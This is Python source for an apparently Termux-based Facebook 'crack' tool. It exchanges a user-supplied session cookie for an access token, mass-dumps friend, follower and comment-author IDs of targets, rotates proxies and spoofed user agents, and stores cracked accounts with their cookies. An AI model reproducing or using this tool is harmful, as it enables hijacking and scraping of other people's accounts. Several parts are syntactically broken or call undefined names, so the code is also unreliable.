
#-----------------[ IMPORT-MODULE ]-------------------#

def modules():
	print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHECKING FOR UPDATES \x1b[37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import requests
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m REQUESTS IS BEING INSTALLED \x1b[37m")
		os.system('pip install requests --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m BS4 IS BEING INSTALLED \x1b[37m")
		os.system('pip install bs4 --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import rich
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m RICH IS BEING INSTALLED \x1b[37m")
		os.system('pip install rich --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	exit()

try:
	import requests as req, re,time,os
	from bs4 import BeautifulSoup as par
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

version='OPEN SOURCE'
file_name=[]
ugen2=[]
logincookie=[]
cekap=[]
askc=[]
scp= 'n'
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]


#------------------[ PROXY ]-------------------#

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass 
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/harryexeee')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#

logo=("""     ___ ___                     _____.___.
    /   |   \_____ ______________\__  |   |
   /    ~    \__  \\_  __ \_  __ \/    |   |
   \    Y    // __ \|  | \/|  | \/\____   |
    \___|_  /(____  /__|   |__|   / _____\x1b[38;5;196mv6\x1b[37m
          \/      \/              \/       """)
def info():
	print(f"""\x1b[37m----------------------------------------------
 AUTHOR     : HARRY BABE
 GITHUB     : HARRY-EXE
 FACEBOOK   : HARRY AKUMA は
 VERSION    : \x1b[37m\x1b[38;5;196m{version}\x1b[37m
\x1b[37m----------------------------------------------""")
def banner():
	print(logo)

#------------------[ ACCOUNT CREATION DATE]-----------------#

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:4] in ['6155']            :tahunz = '2024'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()

#--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	banner()
	info()
	print(""" \x1b[38;5;196m>>\x1b[37m USE DATR COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m LOGIN USING COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CREATE FILE""")
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m JOIN GROUPS  """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '0':
		groups()
	elif lgmt == '2':
		def createfile()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
			mainu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({
	                    'Accept-Language': 'id,en;q=0.9',
	                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	                    'Referer': 'https://www.instagram.com/',
	                    'Host': 'www.facebook.com',
	                    'Sec-Fetch-Mode': 'cors',
	                    'Accept': '*/*',
						'Connection': 'keep-alive',
	                    'Sec-Fetch-Site': 'cross-site',
	                    'Sec-Fetch-Dest': 'empty',
	                    'Origin': 'https://www.instagram.com',
	                    'Accept-Encoding': 'gzip, deflate',
	                })
					response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_id,my_name):
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m-->1\x1b[38;5;196m]\x1b[37m CRACK MENU   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->2\x1b[38;5;196m]\x1b[37m FILE MENU      """)   
	print(f""" \x1b[38;5;196m[\x1b[37m-->3\x1b[38;5;196m]\x1b[37m CHECK RESULTS      """)
	print(f""" \x1b[38;5;196m[\x1b[37m-->4\x1b[38;5;196m]\x1b[37m JOIN GROUPS""")
	print(f""" \x1b[38;5;196m[\x1b[37m-->0\x1b[38;5;196m]\x1b[37m CONTACT ADMIN""")
	linex()
	 choice in  = input(' CHOOSE : ')
	if  choice in  in ['1']:
		main_menu()
	elif  choice in  in ['2']:
		fileclone()
	elif  choice in  in ['3','03']:
		passask()
		harryresults()
	elif  choice in  in ['4','04']:
		group()
	elif  choice in  in ['0']:
		contact()
	
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()
#-----------------[ HASIL-CRACK ]-----------------#
def main(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m-->1\x1b[38;5;196m]\x1b[37m CRACK PUBLIC  """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->2\x1b[38;5;196m]\x1b[37m CRACK FOLLOWER   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->3\x1b[38;5;196m]\x1b[37m CRACK COMMENTS   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->4\x1b[38;5;196m]\x1b[37m CRACK GROUP  """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->5\x1b[38;5;196m]\x1b[37m CRACK EMAIL   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m-->6\x1b[38;5;196m]\x1b[37m CRACK FILE [VIA]  """)    
	ask = input(f' [{hh}--{P}] CHOOSE : ')
	print(' ─────────────────────────────')
	if _____check_____ in ['1']:
		harry_public()
	elif  choice in  in ['2']:
		crack_foll(t,c)()
	elif  choice in  in ['3','03']:
		crack_komen()
	elif  choice in  in ['4','04']:
		crack_group()
	elif  choice in  in ['5','05']:
		clon_email()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()
#----------------------[COMMENTS]--------------------#
def crack_komen():
	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump komen')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r WAIT DUMPING START {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "SEE PREVIOUS COMMENTS…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
#----------------------[FOLLOWER]---------------------------#
def crack_foll(t,c):
	account = input(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC \n ACCOUNT: ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		setting()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] SORRY!!! ACCOUNT IS NOT PUBLIC")		
#-----------------[MENU-CRACK---------------------#
def harryresults():
    ok_file_path = '/sdcard/YOKIA/YOKIA-OK.txt'
    cp_file_path = '/sdcard/YOKIA/YOKIA-CP.txt'

    if not (os.path.exists(ok_file_path) and os.path.exists(cp_file_path)):
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m NO IDS SAVED")
        return
    linex()
    print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CHECK OK IDS \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CHECK CP IDS")
    linex()
    user_choice = input(" CHOOSE : ")

    if user_choice == '1':
        linex()
        show_cookies = input(" \x1b[38;5;196m[\x1b[37m>\x1b[38;5;196m]\x1b[37m SHOW COOKIES (y/n): ").lower() == 'y'
        linex()
        process_file(ok_file_path, show_cookies)
    elif user_choice == '2':
        linex()
        process_file(cp_file_path, show_cookies=False)
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID CHOICE ")

def process_file(file_path, show_cookies):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    for i, line in enumerate(lines, start=1):
        parts = line.strip().split('|')
        if show_cookies:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m  {parts[0]} • {parts[1]}")
            kuki = parts[2]
            print(f" [🍪] {kuki}")
        else:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m {parts[0]} | {parts[1]}")
    linex()
    input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO EXIT ");restart()
#-------------------[ CRACK-PUBLIK ]----------------#
def contact():
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->1\x1b[38;5;196m]\x1b[37m CONTACT WHATSAPP")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->2\x1b[38;5;196m]\x1b[37m CONTACT TELEGRAM")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->3\x1b[38;5;196m]\x1b[37m CONTACT FACEBOOK")
    linex()
    lgmt = input(' CHOOSE : ')
    if lgmt == '1':
        whatsapp()
    elif lgmt == '2':
        telegram()
    elif lgmt == '3':
        facebook()
    else:
        linex()
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()
def whatsapp():
	os.system('xdg-open wa.me/+9779765752720')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
	
def telegram():
	os.system('xdg-open https://t.me/+9779804791363')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

def facebook():
	os.system('xdg-open https://www.facebook.com/prabej.khan.944?mibextid=JRoKGi')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

#-------------------[ CONTACT ]----------------#
def group():
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->1\x1b[38;5;196m]\x1b[37m CONTACT WHATSAPP")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->2\x1b[38;5;196m]\x1b[37m CONTACT TELEGRAM")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m-->3\x1b[38;5;196m]\x1b[37m CONTACT FACEBOOK")
    linex()
    lgmt = input(' CHOOSE : ')
    if lgmt == '1':
        whatsapp()
    elif lgmt == '2':
        telegram()
    elif lgmt == '3':
        facebook()
    else:
        linex()
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()
#----------------------[GROUPOS]------------------#
def whatsapp_group():
	os.system('xdg-open https://chat.whatsapp.com/FUd6zIjyx365bphug0i26p')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
	
def telegram_group():
	os.system('xdg-open https://t.me/+Ykm8W_1IquRlZDk1')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

def facebook_group():
	print('NOT AVAILABLE JUST NOW')
	print('COMMING SOON')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
#-------------------[ CRACK-PUBLIK ]----------------#

def harry_public():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID OPTION ')
		restart()
	if jum<1 or jum>100000000:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	           
			)
			col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def fileopt():
 	crack_file()

def crack_file():
	global file_name
	if file_name:
		o = file_name
	else:
	    linex()
	    o  = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m ONLY OLD IDZ")
	print(" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m ONLY NEW IDZ")
	print(" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m BOTH MIX IDZ")
	linex()
